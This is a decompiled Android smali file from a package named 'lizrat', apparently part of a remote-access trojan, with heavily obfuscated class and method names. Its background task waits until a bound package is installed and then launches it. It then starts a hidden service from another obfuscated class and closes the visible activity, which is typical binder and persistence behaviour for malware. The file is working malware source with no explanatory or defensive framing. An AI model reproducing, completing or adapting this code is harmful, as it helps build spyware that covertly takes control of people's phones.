.class LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;
.super Landroid/os/AsyncTask;
.source "resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = null
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Ljava/lang/String;",
        "Ljava/lang/Void;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# instance fields
.field private myctx:Landroid/content/Context;

.field final synthetic this$0:LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;


# direct methods
.method private constructor <init>(LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;)V
    .locals 0

    .line 60
    iput-object p1, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;->this$0:LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;

    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    const/4 p1, 0x0

    .line 62
    iput-object p1, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;->myctx:Landroid/content/Context;

    return-void
.end method

.method synthetic constructor <init>(LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$1;)V
    .locals 0

    .line 60
    invoke-direct {p0, p1}, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;-><init>(LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;)V

    return-void
.end method

.method static synthetic access$102(LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;Landroid/content/Context;)Landroid/content/Context;
    .locals 0

    .line 60
    iput-object p1, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;->myctx:Landroid/content/Context;

    return-object p1
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 60
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method protected doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 4

    .line 71
    :try_start_0
    sget-object p1, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->T_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_P:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p1

    const-string v0, "null"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    if-nez p1, :cond_3

    const/4 p1, 0x0

    const/4 v0, 0x0

    .line 76
    :cond_0
    :try_start_1
    sget-object v1, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v2, 0x3e8

    invoke-virtual {v1, v2, v3}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_0
    add-int/lit8 v0, v0, 0x1

    .line 79
    :try_start_2
    sget-object v1, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->T_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_P:Ljava/lang/String;

    iget-object v2, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;->this$0:LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;

    invoke-virtual {v2}, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v2

    invoke-static {v1, v2}, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->IP_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_I(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result v1

    if-eqz v1, :cond_1

    .line 81
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->Holdit:Ljava/lang/Boolean;

    goto :goto_0

    :cond_1
    const/16 v1, 0x19

    if-ne v0, v1, :cond_2

    .line 86
    iget-object v1, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;->this$0:LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;

    invoke-virtual {v1}, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->Check_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_Bind()V

    .line 88
    :cond_2
    sget-object v1, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->Holdit:Ljava/lang/Boolean;

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    if-nez v1, :cond_0

    :catch_1
    :cond_3
    :goto_0
    const-string p1, "S!S@S#S$%"

    return-object p1
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .line 60
    check-cast p1, Ljava/lang/String;

    invoke-virtual {p0, p1}, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;->onPostExecute(Ljava/lang/String;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/String;)V
    .locals 3

    .line 106
    :try_start_0
    sget-object p1, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->T_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_P:Ljava/lang/String;

    iget-object v0, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;->this$0:LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;

    invoke-virtual {v0}, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    invoke-static {p1, v0}, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->IP_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_I(Ljava/lang/String;Landroid/content/pm/PackageManager;)Z

    move-result p1

    if-eqz p1, :cond_0

    sget-object p1, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->T_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_P:Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p1

    const-string v0, "null"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-nez p1, :cond_0

    .line 108
    iget-object p1, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;->this$0:LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;

    invoke-virtual {p1}, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p1

    .line 109
    sget-object v0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->T_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_P:Ljava/lang/String;

    invoke-virtual {p1, v0}, Landroid/content/pm/PackageManager;->getLaunchIntentForPackage(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    const/high16 v0, 0x10000000

    .line 110
    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 111
    iget-object v0, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;->myctx:Landroid/content/Context;

    invoke-virtual {v0, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 120
    :catch_0
    :cond_0
    :try_start_1
    const-class p1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;

    iget-object v0, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;->this$0:LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;

    invoke-virtual {v0}, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->getApplication()Landroid/app/Application;

    move-result-object v0

    invoke-static {p1, v0}, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew30;->fitltrialrfairlyglesskkennethqspecificationstenterpriseswcigarettesrmatewtonyldimelinkingz49(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_1

    .line 121
    iget-object p1, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;->myctx:Landroid/content/Context;

    new-instance v0, Landroid/content/Intent;

    sget-object v1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->app_membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31_Context:Landroid/content/Context;

    const-class v2, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 125
    :catch_1
    :cond_1
    iget-object p1, p0, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10$FI_resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10_N;->this$0:LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;

    invoke-virtual {p1}, LLiz0rd/lizrat/resultksugarkgatewtomxcolumnistsenailystockholmqupdatingcdiesellgmypermitsyquantitativetguaranteet10;->finish()V

    return-void
.end method
